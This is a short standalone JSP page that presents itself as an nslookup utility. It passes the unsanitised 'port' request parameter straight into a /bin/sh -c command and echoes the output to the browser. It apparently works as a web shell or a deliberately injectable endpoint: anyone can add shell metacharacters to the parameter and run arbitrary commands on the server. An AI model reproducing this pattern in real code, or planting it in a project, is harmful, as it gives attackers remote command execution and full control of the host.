<%@ page import="java.util.*,java.io.*"%>


<%
    if (request.getParameter("port") != null) {
        Process p = Runtime.getRuntime().exec("/bin/sh -c 'nslookup " + request.getParameter("port") + "'");
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>
